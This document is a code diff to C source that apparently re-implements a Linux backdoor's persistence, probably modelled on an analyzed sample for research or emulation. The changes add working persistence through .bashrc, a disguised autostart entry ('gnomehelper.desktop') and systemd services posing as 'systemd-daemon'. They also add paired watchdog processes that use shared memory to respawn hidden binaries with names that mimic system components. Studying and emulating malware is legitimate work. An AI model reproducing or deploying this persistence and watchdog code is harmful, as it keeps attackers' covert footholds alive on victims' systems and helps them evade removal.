@@ -69,7 +69,6 @@ bool nonroot_bashrc_persistence() {
     strncat(fpath, HOME, strlen(HOME));
     strncat(fpath, bashrc, strlen(bashrc));
 
-    // TODO: decrypt and rotate char array for stack string to then execute write_to_file
     int fd = open(fpath, O_CREAT| O_WRONLY| O_APPEND , 0755);
     if (fd < 0) {
         return false;
@@ -249,9 +248,21 @@ bool nonroot_desktop_persistence() {
 
 bool nonroot_persistence(void) {
     // handy wraper funtion for non-root persistence.
-    // note - this is not 1:1 with how the analyzed samples call persistence methods.
-    nonroot_desktop_persistence();
-    nonroot_bashrc_persistence();
+
+    char *home = getenv("HOME");
+    char *desktop_path = "/.config/au-tostart/gnomehelper.desktop";
+    int desktop_path_size = strlen(home) + strlen(desktop_path);
+
+    char *home_desktop_path = (char *)malloc(desktop_path_size);
+    memcpy(home_desktop_path, home, strlen(home));
+    strncat(home_desktop_path, desktop_path, strlen(desktop_path));
+
+    if (access(home_desktop_path, F_OK) != 0) {
+        nonroot_desktop_persistence();
+        nonroot_bashrc_persistence();
+    }
+
+    free(home_desktop_path);
     return true;
 }
 
@@ -287,6 +298,7 @@ bool root_persistence(void) {
         memset(fpath,0, fpath_size);
         result = write_to_file(fpath, systemd_agent_conf);
         copy_rota_to_userland("/bin/systemd/systemd-daemon");
+        free(fpath);
 
     } else { // non systemd system...
         /**
@@ -311,6 +323,7 @@ bool root_persistence(void) {
 
         result = write_to_file(fpath, sys_temd_agent_service);
         copy_rota_to_userland("/usr/lib/systemd/systemd-daemon");
+        free(fpath);
     }
 
     free(fpath);
@@ -335,6 +348,7 @@ bool monitor_proc(int *pid) {
 
     int res = access(finalpath, F_OK);
     free(finalpath);
+    free(c_pid);
     if (res == 0 ) {
         return true; // file exists
     } else {
@@ -355,7 +369,7 @@ void fork_exec(char *fpath) {
         exit(1);
     } else if (res == 0){
         // child process to execvp;
-        execvp(fpath, NULL);
+        execlp(fpath, fpath, NULL);
     } else {
         waitpid(res, &wstatus, 0);
     }
@@ -367,8 +381,6 @@ void *watchdog_process_shmget() {
     signal(SIGCHLD, SIG_IGN);
 
     // detach from current console, and make systemd the parent
-    //daemon(0,0);
-
     bool proc_alive;
     int pid = getpid();
 
@@ -386,9 +398,7 @@ void *watchdog_process_shmget() {
     // write PID to sharedmem
     int *addr = (int *)shmat(shmid, NULL, 0);
     memcpy(addr, &pid, 4);
-    sleep(10);
 
-    // TODO - stackstring + AES + ROR here
     do {
 
         // get handle to shared mem
@@ -412,18 +422,27 @@ void *watchdog_process_shmget() {
                     getpid(),
                     upper_bytes);
 
-            // TODO - stack string file path  and dynamically resolve it.
-            char* argument_list[] = {"/bin/sh", "-c", "/home/gdev/.dbus/sessions/session-dbus", "&", NULL}; // NULL terminated array of char* strings
+
+            char *user = getenv("HOME");
+            char *sessiondbus_helper_path = "/.dbus/sessions/session-dbus";
+            int sessiondbus_path_size = strlen(user) + strlen(sessiondbus_helper_path);
+            char *user_sessiondbus_helper_path = (char *)malloc(sessiondbus_path_size);
+            memset(user_sessiondbus_helper_path, 0, sessiondbus_path_size);
+
+            memcpy(user_sessiondbus_helper_path, user, strlen(user));
+            strncat(user_sessiondbus_helper_path, sessiondbus_helper_path, strlen(sessiondbus_helper_path));
+            //char* argument_list[] = {"/bin/sh", "-c", "/home/gdev/.dbus/sessions/session-dbus", "&", NULL}; // NULL terminated array of char* strings
+            char* argument_list[] = {"/bin/sh", "-c", user_sessiondbus_helper_path, "&", NULL}; // NULL terminated array of char* strings
             int f_pid = fork();
             if (f_pid == 0) {
                 execvp("/bin/sh", argument_list);
             }
             close(f_pid);
+            free(user_sessiondbus_helper_path);
         }
 
-        sleep(5);
+        sleep(10);
     } while(true);
-
 
 
     // detatch from process
@@ -447,13 +466,24 @@ void *watchdog_process_shmread() {
             #ifdef DEBUG
             fprintf(stderr, "\n[watchdog_process_shmread](%d) %s\n", getpid(), strerror(errno));
             #endif
+            sleep(2);
+            watchdog_process_shmread();
         }
 
-
-        // write PID to sharedmem
+        sleep(3);
+        // get PID to write sharedmem
         int pid = getpid();
         int *addr = shmat(shmid, NULL, 0);
-        memcpy(addr+4, &pid, 4); // copy to "upper half" of 8 bytes.:
+
+        // check address obtained is valid
+        if (*addr == -1) {
+            #ifdef DEBUG
+            fprintf(stderr, "error accessing memory!");
+            #endif
+            exit(1);
+        }
+
+        memcpy(addr+4, &pid, 4); // copy to "upper half" of 8 bytes:
 
         #ifdef DEBUG
         fprintf(stdout, "\n[wathcdog_process_shmread] wrote %d to shared memory\n", getpid());
@@ -461,7 +491,6 @@ void *watchdog_process_shmread() {
 
         // get pid from shared memory.
         int *shmem_pid_addr = (int *)shmat(shmid, NULL, 0);
-        // TODO - parse out mem from lower 4 bytes.
         int *tmpPid = (int *)malloc(4);
         memset(tmpPid, 0, 4);
         memcpy(tmpPid, shmem_pid_addr, 4);
@@ -479,17 +508,27 @@ void *watchdog_process_shmread() {
             fprintf(stderr, "[shmread] (%d) process id %d is not alive! spawning\n", getpid(), *tmpPid);
             #endif
 
-            // TODO - stack string file path  and dynamically resolve it.
-            char* argument_list[] = {"/bin/sh", "-c", "/home/gdev/.gvfsd/.profile/gvfsd-helper", "&", NULL}; // NULL terminated array of char* strings
+            char *user = getenv("HOME");
+            char *gvfsd_helper_path = "/.gvfsd/.profile/gvfsd-helper";
+            int gvfsd_path_size = strlen(user) + strlen(gvfsd_helper_path);
+            char *user_gvfsd_helper_path = (char *)malloc(gvfsd_path_size);
+            memset(user_gvfsd_helper_path, 0, gvfsd_path_size);
+
+            memcpy(user_gvfsd_helper_path, user, strlen(user));
+            strncat(user_gvfsd_helper_path, gvfsd_helper_path, strlen(gvfsd_helper_path));
+
+            //char* argument_list[] = {"/bin/sh", "-c", "/home/gdev/.gvfsd/.profile/gvfsd-helper", "&", NULL}; // NULL terminated array of char* strings
+            char* argument_list[] = {"/bin/sh", "-c", user_gvfsd_helper_path, "&", NULL}; // NULL terminated array of char* strings
 
             int f_pid = fork();
             if (f_pid == 0) {
                 execvp("/bin/sh", argument_list);
             }
             close(f_pid);
+            free(user_gvfsd_helper_path);
         }
 
-        sleep(3);
+        sleep(6);
     } while(true);
 
    pthread_detach(pthread_self());
@@ -499,13 +538,10 @@ void spawn_thread_watchdog(int uid) {
     pthread_t threadid;
     if (uid == 0){
         // the "parent thread" monitors session-dbus
-        //pthread_create(&threadid, NULL, watchdog_process_shmget, fpath);
-         watchdog_process_shmget();
+        pthread_create(&threadid, NULL, watchdog_process_shmget, NULL);
 
-        // testing
     } else {
         // the "child thread" monitors gvfsd-helper
-        // pthread_create(&threadid, NULL, watchdog_process_shmread, fpath);
-        watchdog_process_shmread();
+        pthread_create(&threadid, NULL, watchdog_process_shmread, NULL);
     }
 }
